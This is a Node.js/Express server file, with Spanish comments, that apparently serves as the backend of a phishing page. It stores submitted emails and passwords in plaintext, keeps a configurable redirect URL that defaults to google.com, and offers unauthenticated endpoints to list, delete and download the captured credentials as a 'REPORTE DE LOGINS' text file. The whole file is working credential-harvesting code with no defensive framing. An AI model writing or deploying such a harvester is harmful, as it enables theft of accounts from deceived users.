const express = require("express");
const sqlite3 = require("sqlite3").verbose();
const cors = require("cors");
const path = require("path");

const app = express();

// Middlewares
app.use(cors());
app.use(express.json());
app.use(express.static("public"));

// Base de Datos
const db = new sqlite3.Database("database.db");

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS logins (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        password TEXT,
        date DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS config (
        id INTEGER PRIMARY KEY,
        redirect_url TEXT
    )`, () => {
        db.run("INSERT OR IGNORE INTO config (id, redirect_url) VALUES (1, 'https://www.google.com')");
    });
});

// Rutas de Configuración
app.get("/config", (req, res) => {
    db.get("SELECT redirect_url FROM config WHERE id = 1", (err, row) => {
        res.json(row || { redirect_url: "https://www.google.com" });
    });
});

app.post("/config", (req, res) => {
    const { url } = req.body;
    db.run("UPDATE config SET redirect_url = ? WHERE id = 1", [url], () => {
        res.json({ success: true });
    });
});

// Rutas de Datos
app.post("/login", (req, res) => {
    const { email, password } = req.body;
    db.run("INSERT INTO logins (email, password) VALUES (?, ?)", [email, password], () => {
        res.json({ saved: true });
    });
});

app.get("/data", (req, res) => {
    db.all("SELECT * FROM logins ORDER BY id DESC", (err, rows) => {
        res.json(rows);
    });
});

app.delete("/delete/:id", (req, res) => {
    db.run("DELETE FROM logins WHERE id = ?", [req.params.id], () => {
        res.json({ deleted: true });
    });
});

app.get("/download/:limit", (req, res) => {
    const limit = Number(req.params.limit) || 100;
    db.all("SELECT * FROM logins ORDER BY id DESC LIMIT ?", [limit], (err, rows) => {
        let text = "REPORTE DE LOGINS\n\n";
        rows.forEach(row => {
            text += `ID: ${row.id} | Email: ${row.email} | Pass: ${row.password} | Fecha: ${row.date}\n`;
        });
        res.setHeader("Content-Disposition", "attachment; filename=datos.txt");
        res.send(text);
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor en puerto ${PORT}`));
